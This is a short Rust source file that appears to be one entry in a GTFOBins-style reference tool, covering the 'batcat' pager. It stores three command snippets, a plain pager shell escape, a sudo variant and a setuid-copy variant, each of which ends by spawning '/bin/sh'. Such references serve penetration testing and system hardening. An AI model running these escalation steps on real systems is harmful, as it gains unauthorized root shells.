
pub static BIN_NAME: &'static str = "batcat";
pub static BIN_DESC: &'static str = "This invokes the default pager, which is likely to be `less`, other functions may apply. `--paging always` can be omitted provided that the output doesn’t fit the screen.";
pub static SH_CODE: &'static str = r#"
    
    batcat --paging always /etc/profile
    !/bin/sh
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo batcat --paging always /etc/profile
    !/bin/sh
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which batcat) .

    ./batcat --paging always /etc/profile
    !/bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
